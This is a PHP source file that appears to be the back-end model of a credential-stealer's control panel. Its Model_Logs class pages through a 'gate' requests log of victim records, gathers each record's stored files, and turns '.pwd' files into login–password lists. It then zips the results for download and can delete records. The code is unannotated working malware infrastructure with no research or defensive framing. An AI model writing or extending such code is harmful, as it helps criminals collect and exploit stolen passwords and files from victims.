<?php
	function rrmdir($dir, $res = false)
	{
		if (is_dir($dir))
		{
			$objects = scandir($dir);
			foreach ($objects as $object)
			{
				if ($object != "." && $object != "..")
				{
					if(filetype($dir."/".$object) == "dir")
					{
						rrmdir($dir."/".$object, true);
					}
					else unlink($dir."/".$object);
				}
			}
			reset($objects);
			if($res) rmdir($dir);
		}
	}
	function recscan($path)
	{
		$files = scan($path);
		$result = array();
		foreach($files as $file)
		{
			if((fileperms($file) & 0x4000) == 0x4000)
			{
				foreach(recscan($file) as $dile)
					$result[] = $dile;
			}
			else $result[] = $file;
		}
		return $result;
	}
	function scan($dir)
	{
		if(!file_exists($dir)) return null;
		$result = array();
		$files = array_diff(scandir($dir), array('..', '.', '.htaccess', 'cgi-bin', '.DS_Store'));
		foreach($files as $file) $result[] = "$dir/$file";
		return $result;
	}
	function find($dir, $mask)
	{
		$result = array();
		$files = scan($dir);
		if(!count($files)) return null;
		foreach($files as $file)
		{
			if((fileperms($file) & 0x4000) == 0x4000) 
			{
				if(strcmp(pathinfo($file)['filename'], $mask) === 0)
				{
					$result[] = $file;
				}
				else
				{
					$temp = find($file, $mask);
					if(!count($temp)) continue;
					foreach($temp as $hall)
						$result[] = $hall;
				}
			}
			else
			{
				if(strcmp(pathinfo($file)['filename'], $mask) === 0)
				{
					$result[] = $file;
				}
			}
		}
		return $result;
	}
	function createZip($files, $destination = '', $tod = '', $overwrite = false)
	{
		if(file_exists($destination) && !$overwrite) return false;
		$valid_files = array();
		if(is_array($files)) 
		{
			foreach($files as $file) 
			{
				if(file_exists($file))
				{
					$valid_files[] = $file;
				}
			}
		}
		if(count($valid_files))
		{
			$zip = new ZipArchive();
			if($zip->open($destination, $overwrite ? ZipArchive::OVERWRITE : ZipArchive::CREATE) !== true)
				return false;
			foreach($valid_files as $file)
			{
				$tmp = str_replace($tod, '', $file);
				if(is_dir($file))
					$zip->addEmptyDir($tmp);
				else
					$zip->addFile($file, $tmp);
			}
			$zip->close();
			return file_exists($destination);
		}
	}
	class Model_Logs extends Model
	{
		public function getLogs($page = 0, &$pcount = 1)
		{
			if(!file_exists('gate/other/requests.log')) return null;
			$result = array();
			$curp = 0;
			$users = explode('<:>', file_get_contents('gate/other/requests.log'));
			foreach($users as $key)
				if(!empty($key))
					$curp++;
			$pcount = ceil($curp / 10);
			if($page > $pcount) return null;
			$from = $page * 10;
			$tilde = ($page + 1) * 10;
			for($i=$from;$i<$tilde;$i++)
			{
				if($i > $curp || !isset($users[$i])) break;
				$result[] = explode('<;>', $users[$i]);
			}
			return $result;
		}
		public function upload_($unix)
		{
			$sq = find('gate/storage', $unix);
			if(count($sq) > 0)
			{
				$time = time();
				$tmpname = "temp/$time";
				mkdir("$tmpname", 0755, true);
				foreach($sq as $key)
				{
					$ftype = explode('/', $key)[2];
					if((fileperms($key) & 0x4000) == 0x4000) 
					{
						mkdir("$tmpname/$ftype", 0755, true);
						$keks = scan($key);
						foreach($keks as $klo)
						{
							$ext = pathinfo($klo)['extension'] != null ? '.'.pathinfo($klo)['extension'] : '';
							$filename = pathinfo($klo)['filename'].$ext;
							copy($klo, "$tmpname/$ftype/$filename");
						}
					}
					else
					{
						if(mb_strpos(pathinfo($key)['extension'], 'pwd') !== false)
						{
							$entry = file_get_contents($key);
							$entry = str_replace('<;!:;>', ' - ', $entry);
							$entry = str_replace('<:;:!>', PHP_EOL, $entry);
							file_put_contents("$tmpname/$ftype.txt", $entry);
						}
						else copy($key, "$tmpname/$ftype.txt");
					}
				}
				$fls = recscan($tmpname);
				createZip($fls, "$tmpname.zip", "temp/$time/");
				header('Content-Type: application/octet-stream');
				header('Content-Length: '.filesize("$tmpname.zip"));
				header("Content-Disposition: attachment; filename=$tmpname.zip");
				readfile("$tmpname.zip");
				unlink("$tmpname.zip");
				rrmdir($tmpname, true);
			}
			else return 'jarah';
		}
		public function cleanList()
		{
			unlink('gate/other/requests.log');
		}
		public function delete_($unix)
		{
			$fileName = 'gate/other/requests.log';
			$cont = file_get_contents($fileName);
			$uidx = mb_strpos($cont, $unix);
			$eidx = mb_strpos($cont, '<:>', $uidx) + 3;
			$strt = mb_substr($cont, 0, $uidx);
			$endt = mb_substr($cont, $eidx);
			file_put_contents($fileName, "$strt$endt");
		}
	}
?>